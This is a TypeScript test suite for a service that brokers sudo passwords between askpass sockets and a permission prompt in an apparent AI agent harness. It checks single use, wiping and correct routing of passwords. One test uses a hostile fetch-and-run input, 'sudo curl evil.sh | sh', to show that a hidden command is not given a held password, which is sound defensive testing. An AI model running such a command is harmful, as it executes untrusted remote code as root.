import { describe, it, expect, vi } from 'vitest';
import { EventEmitter } from 'events';
import { AdminPasswordService } from '../src/main/harness/admin-password-service';
import type { PasswordAskRequest } from '../src/main/harness/permission-broker';
import type { AskpassAskEvent } from '../src/main/harness/askpass/askpass-server';

// A minimal but REAL re-implementation of the broker's and AskpassServer's behavior this service depends on (not vi.fn()s),
// so the ordering tests (submit() forgetting its mapping BEFORE withdraw() fires PasswordResolved) exercise the real event loop.
class FakeBroker extends EventEmitter {
  calls: PasswordAskRequest[] = [];
  private counter = 0;
  lastRequestId = '';
  askPassword(req: PasswordAskRequest): string {
    this.calls.push(req);
    const id = `native-pw-${++this.counter}`;
    this.lastRequestId = id;
    return id;
  }
  withdraw(id: string): boolean {
    this.emit('hook-event', { type: 'PasswordResolved', sessionId: 's', payload: { _requestId: id } });
    return true;
  }
}

class FakeAskpass extends EventEmitter {
  delivered: Array<{ askId: string; password: Buffer }> = [];
  refused: string[] = [];
  deliverResult = true;
  deliver(askId: string, password: Buffer): boolean {
    this.delivered.push({ askId, password });
    return this.deliverResult;
  }
  refuse(askId: string): boolean {
    this.refused.push(askId);
    return true;
  }
}

function askEvent(overrides: Partial<AskpassAskEvent> = {}): AskpassAskEvent {
  return {
    askId: 'ask-1',
    sudoPid: 111,
    sudoArgv: ['sudo', 'apt', 'update'],
    sudoExePath: '/usr/bin/sudo',
    callRoot: 1,
    toolCallId: 'bash-1',
    sessionId: 's1',
    attempt: 0,
    ...overrides,
  };
}

type ServiceDeps = Partial<ConstructorParameters<typeof AdminPasswordService>[0]>;
/** A service wired to a fresh fake broker and askpass. */
function rig(deps: ServiceDeps = {}) {
  const broker = new FakeBroker();
  const askpass = new FakeAskpass();
  const service = new AdminPasswordService({ broker, askpass, ...deps } as any);
  return { broker, askpass, service };
}
const UPFRONT = { sessionId: 's1', toolCallId: 'bash-1', expectedArgvLines: [['apt', 'update']] };
/** The broker's own PasswordResolved (what PermissionBroker.cancelSession/cancelAll emit, bypassing the service's withdraw()). */
const resolved = (broker: FakeBroker, requestId: string) =>
  broker.emit('hook-event', { type: 'PasswordResolved', sessionId: 's1', payload: { _requestId: requestId } });
/** An up-front password submitted and now HELD (no askpass connection exists yet). */
async function heldUpFront(deps: ServiceDeps = {}) {
  const r = rig(deps);
  const p = r.service.askUpFront(UPFRONT);
  r.service.submit(r.broker.lastRequestId, 'sekrit');
  await p;
  return r;
}
/** Run `fn` with fake timers, always restoring real ones. */
const withFakeTimers = (fn: () => void) => () => { vi.useFakeTimers(); try { fn(); } finally { vi.useRealTimers(); } };

describe('AdminPasswordService — turning a verified askpass connection into a PasswordRequest', () => {
  it('registers a broker password ask built from the sudo argv, with no specialist label for a plain session', () => {
    const { broker, askpass } = rig();
    askpass.emit('ask', askEvent());
    expect(broker.calls).toHaveLength(1);
    expect(broker.calls[0]).toMatchObject({
      sessionId: 's1', toolUseId: 'bash-1',
      command: 'apt update', // sudo + no flags stripped
      triesLeft: undefined, specialist: undefined, raisedBy: undefined,
    });
  });

  it('threads `via` through from the ask event', () => {
    const { broker, askpass } = rig();
    askpass.emit('ask', askEvent({ via: 'install.sh' }));
    expect(broker.calls[0].via).toBe('install.sh');
  });

  // Design: "attempt 0 -> undefined; n -> 3-n".
  it.each([[0, undefined], [1, 2], [2, 1], [3, 0]])('maps attempt %d to triesLeft %s', (attempt, expected) => {
    const { broker, askpass } = rig();
    askpass.emit('ask', askEvent({ attempt }));
    expect(broker.calls[0].triesLeft).toBe(expected);
  });

  it('routes a specialist child\'s own sudo to the PARENT session, labelled like childAskRouter', () => {
    const resolveSpecialistChild = (sessionId: string) =>
      sessionId === 'child-session-1'
        ? { parentId: 'parent-1', childId: 'child-1', agentType: 'worker', title: 'Wren the Worker', parentToolCallId: 'task-1' }
        : null;
    const { broker, askpass } = rig({ resolveSpecialistChild });
    askpass.emit('ask', askEvent({ sessionId: 'child-session-1' }));
    expect(broker.calls[0]).toMatchObject({
      sessionId: 'parent-1',
      raisedBy: 'child-1',
      specialist: { childId: 'child-1', agentType: 'worker', title: 'Wren the Worker', parentToolCallId: 'task-1' },
    });
  });

  it('leaves the ask on its own session when resolveSpecialistChild finds nothing', () => {
    const { broker, askpass } = rig({ resolveSpecialistChild: () => null });
    askpass.emit('ask', askEvent());
    expect(broker.calls[0].sessionId).toBe('s1');
    expect(broker.calls[0].specialist).toBeUndefined();
  });
});

describe('AdminPasswordService.submit — the one place `password` is converted to a Buffer', () => {
  it('delivers a Buffer built from the password to the right askpass connection, then withdraws the broker ask', () => {
    const { broker, askpass, service } = rig();
    askpass.emit('ask', askEvent());
    expect(service.submit(broker.lastRequestId, 'sekrit')).toBe(true);
    expect(askpass.delivered).toHaveLength(1);
    expect(askpass.delivered[0].askId).toBe('ask-1');
    expect(askpass.delivered[0].password).toBeInstanceOf(Buffer);
    expect(askpass.delivered[0].password.toString('utf8')).toBe('sekrit');
    expect(askpass.refused).toEqual([]); // delivered, not refused
  });

  it('returns false for an unknown requestId, and touches neither askpass nor the broker', () => {
    const { askpass, service } = rig();
    expect(service.submit('nope', 'x')).toBe(false);
    expect(askpass.delivered).toEqual([]);
  });

  it('returns false when the askpass connection is already gone (deliver refuses)', () => {
    const { broker, askpass, service } = rig();
    askpass.deliverResult = false;
    askpass.emit('ask', askEvent());
    expect(service.submit(broker.lastRequestId, 'sekrit')).toBe(false);
    expect(askpass.delivered).toHaveLength(1); // still attempted
  });

  it('does not deliver twice for the same requestId (a repeat submit is an unknown-id no-op)', () => {
    const { broker, askpass, service } = rig();
    askpass.emit('ask', askEvent());
    const requestId = broker.lastRequestId;
    expect(service.submit(requestId, 'first')).toBe(true);
    expect(service.submit(requestId, 'second')).toBe(false);
    expect(askpass.delivered).toHaveLength(1);
    expect(askpass.delivered[0].password.toString('utf8')).toBe('first');
  });

  it('never logs or stores the password anywhere reachable after the call returns', () => {
    const { broker, askpass, service } = rig();
    askpass.emit('ask', askEvent());
    service.submit(broker.lastRequestId, 'the-actual-secret');
    for (const value of Object.values(service as unknown as Record<string, unknown>)) {
      if (typeof value === 'function') continue; // JSON.stringify(fn) is undefined, not "absent"
      expect(JSON.stringify(value) ?? '').not.toContain('the-actual-secret');
    }
  });
});

describe('AdminPasswordService — the socket side (withdrawn) and the broker side (PasswordResolved)', () => {
  /** Count/record the broker's withdraw() calls. */
  function spyWithdraw(broker: FakeBroker) {
    const withdrawn: string[] = [];
    const original = broker.withdraw.bind(broker);
    broker.withdraw = (id: string) => { withdrawn.push(id); return original(id); };
    return withdrawn;
  }

  it('a socket closing (withdrawn) tells the broker to withdraw the matching ask, once', () => {
    const { broker, askpass } = rig();
    const withdrawn = spyWithdraw(broker);
    askpass.emit('ask', askEvent());
    const requestId = broker.lastRequestId;
    askpass.emit('withdrawn', 'ask-1');
    askpass.emit('withdrawn', 'ask-1'); // a repeat is a no-op: the mapping is already gone
    expect(withdrawn).toEqual([requestId]);
  });

  it('a withdrawn askId this service never registered is a no-op', () => {
    const { broker, askpass } = rig();
    expect(() => askpass.emit('withdrawn', 'never-heard-of-it')).not.toThrow();
    expect(broker.calls).toEqual([]);
  });

  it("the broker's own PasswordResolved (session Stop/Skip/close/quit) refuses the still-open askpass socket", () => {
    const { broker, askpass } = rig();
    askpass.emit('ask', askEvent());
    resolved(broker, broker.lastRequestId);
    expect(askpass.refused).toEqual(['ask-1']);
  });

  it("submit()'s own withdraw() does NOT also trigger a refuse (the mapping is forgotten first)", () => {
    const { broker, askpass, service } = rig();
    askpass.emit('ask', askEvent());
    service.submit(broker.lastRequestId, 'sekrit');
    // withdraw() emits PasswordResolved synchronously; a still-present mapping would refuse the socket just delivered to.
    expect(askpass.refused).toEqual([]);
  });

  it('a PasswordResolved for an unknown/already-forgotten requestId is a no-op', () => {
    const { broker, askpass } = rig();
    expect(() => resolved(broker, 'never-asked')).not.toThrow();
    expect(askpass.refused).toEqual([]);
  });

  it('ignores every other hook-event type (e.g. PermissionResolved) on the broker', () => {
    const { broker, askpass } = rig();
    askpass.emit('ask', askEvent());
    broker.emit('hook-event', { type: 'PermissionResolved', sessionId: 's1', payload: { _requestId: broker.lastRequestId } });
    expect(askpass.refused).toEqual([]);
  });
});

// The up-front flow: a password asked for and held before any askpass connection exists.
describe('AdminPasswordService.askUpFront — held before any askpass connection exists', () => {
  it('registers a broker password ask with the FIRST visible sudo line, no via', () => {
    const { broker, service } = rig();
    void service.askUpFront(UPFRONT);
    expect(broker.calls).toHaveLength(1);
    expect(broker.calls[0]).toMatchObject({ sessionId: 's1', toolUseId: 'bash-1', command: 'apt update' });
    expect(broker.calls[0].via).toBeUndefined();
  });

  it('resolves "submitted" on submit(), and the password is HELD — never delivered to askpass directly', async () => {
    const { broker, askpass, service } = rig();
    const p = service.askUpFront(UPFRONT);
    expect(service.submit(broker.lastRequestId, 'sekrit')).toBe(true);
    expect(await p).toBe('submitted');
    expect(askpass.delivered).toEqual([]); // no askpass connection exists yet
  });

  it('a Skip/Stop/session-close cancellation resolves "canceled" (the same broker.cancelSession path a permission ask uses)', async () => {
    const { broker, service } = rig();
    const p = service.askUpFront(UPFRONT);
    resolved(broker, broker.lastRequestId);
    expect(await p).toBe('canceled');
  });

  it('a matching later askpass connection gets the held password with NO card', async () => {
    const { broker, askpass } = await heldUpFront();
    const callsBefore = broker.calls.length;
    askpass.emit('ask', askEvent({ askId: 'ask-real', sudoArgv: ['sudo', 'apt', 'update'] }));
    expect(askpass.delivered).toHaveLength(1);
    expect(askpass.delivered[0].askId).toBe('ask-real');
    expect(askpass.delivered[0].password.toString('utf8')).toBe('sekrit');
    expect(broker.calls.length).toBe(callsBefore); // no NEW card was raised
  });

  it('a NON-matching sudo elsewhere in the same call gets the ordinary card instead, leaving the hold intact', async () => {
    const { broker, askpass } = await heldUpFront();
    askpass.emit('ask', askEvent({ askId: 'ask-hidden', sudoArgv: ['sudo', 'curl', 'evil.sh', '|', 'sh'] }));
    expect(askpass.delivered).toEqual([]); // NOT auto-delivered
    expect(broker.calls).toHaveLength(2);   // the up-front ask, then this ordinary one
    // The hold survives: a LATER matching ask still gets it silently.
    askpass.emit('ask', askEvent({ askId: 'ask-real', sudoArgv: ['sudo', 'apt', 'update'] }));
    expect(askpass.delivered).toHaveLength(1);
    expect(askpass.delivered[0].askId).toBe('ask-real');
  });

  it('the held password is used at most once, even against a repeated matching argv', async () => {
    const { broker, askpass } = await heldUpFront();
    askpass.emit('ask', askEvent({ askId: 'ask-1', sudoArgv: ['sudo', 'apt', 'update'] }));
    expect(askpass.delivered).toHaveLength(1);
    // A SECOND matching ask has nothing held: it falls to the ordinary card.
    askpass.emit('ask', askEvent({ askId: 'ask-2', sudoArgv: ['sudo', 'apt', 'update'] }));
    expect(askpass.delivered).toHaveLength(1); // unchanged
    expect(broker.calls).toHaveLength(2);       // the up-front ask + this new card
  });
});

describe('AdminPasswordService.wipeUpfront — dropping an unconsumed held password', () => {
  it('zeroes and drops a held password that was never consumed', async () => {
    const { askpass, service } = await heldUpFront();
    service.wipeUpfront('bash-1');
    // Nothing left to hand out: a later ask that would have matched falls to the ordinary card.
    askpass.emit('ask', askEvent({ sudoArgv: ['sudo', 'apt', 'update'] }));
    expect(askpass.delivered).toEqual([]);
  });

  it('is a cheap no-op when nothing is held for that toolCallId', () => {
    expect(() => rig().service.wipeUpfront('never-asked')).not.toThrow();
  });
});

describe('AdminPasswordService — RunningCalls wiring', () => {
  const runningCalls = () => ({ markGranted: vi.fn(), recordSudoPath: vi.fn() });

  it('markGranted + recordSudoPath fire on a mid-command delivery', () => {
    const rc = runningCalls();
    const { broker, askpass, service } = rig({ runningCalls: rc });
    askpass.emit('ask', askEvent({ sudoExePath: '/usr/bin/sudo' }));
    service.submit(broker.lastRequestId, 'sekrit');
    expect(rc.markGranted).toHaveBeenCalledWith('bash-1');
    expect(rc.recordSudoPath).toHaveBeenCalledWith('/usr/bin/sudo');
  });

  it('markGranted + recordSudoPath fire on an up-front-matched delivery too', async () => {
    const rc = runningCalls();
    const { askpass } = await heldUpFront({ runningCalls: rc });
    askpass.emit('ask', askEvent({ sudoArgv: ['sudo', 'apt', 'update'], sudoExePath: '/usr/bin/sudo' }));
    expect(rc.markGranted).toHaveBeenCalledWith('bash-1');
    expect(rc.recordSudoPath).toHaveBeenCalledWith('/usr/bin/sudo');
  });

  it('does not throw when no runningCalls dep is injected', () => {
    const { broker, askpass, service } = rig();
    askpass.emit('ask', askEvent());
    expect(() => service.submit(broker.lastRequestId, 'sekrit')).not.toThrow();
  });
});

// Feeds ShellRegistry.admin.
describe('AdminPasswordService — the "accepted" signal', () => {
  it('emits "accepted" ~1s after a delivery with no re-ask for the same sudo pid', withFakeTimers(() => {
    const { broker, askpass, service } = rig();
    const accepted = vi.fn();
    service.on('accepted', accepted);
    askpass.emit('ask', askEvent({ sudoPid: 999 }));
    service.submit(broker.lastRequestId, 'sekrit');
    expect(accepted).not.toHaveBeenCalled();
    vi.advanceTimersByTime(1_000);
    expect(accepted).toHaveBeenCalledWith({ sessionId: 's1', toolCallId: 'bash-1' });
  }));

  it('a re-ask for the SAME sudo pid (the previous password was wrong) cancels the pending "accepted" signal', withFakeTimers(() => {
    const { broker, askpass, service } = rig();
    const accepted = vi.fn();
    service.on('accepted', accepted);
    askpass.emit('ask', askEvent({ sudoPid: 999, attempt: 0 }));
    service.submit(broker.lastRequestId, 'wrong');
    vi.advanceTimersByTime(500); // sudo asks again on the SAME pid before the 1s window elapses
    askpass.emit('ask', askEvent({ sudoPid: 999, attempt: 1, askId: 'ask-2' }));
    vi.advanceTimersByTime(1_000);
    expect(accepted).not.toHaveBeenCalled();
  }));
});

describe('AdminPasswordService — remembers a refused request for its call', () => {
  it('hands the first refusal reason to takeRefusal once, then forgets it', () => {
    const { askpass, service } = rig();
    askpass.emit('refused', { toolCallId: 'bash-7', sessionId: 's1', reason: 'parent-not-sudo' });
    askpass.emit('refused', { toolCallId: 'bash-7', sessionId: 's1', reason: 'traced' });
    expect(service.takeRefusal('bash-7')).toBe('parent-not-sudo');
    expect(service.takeRefusal('bash-7')).toBeUndefined();
    expect(service.takeRefusal('other')).toBeUndefined();
  });
});
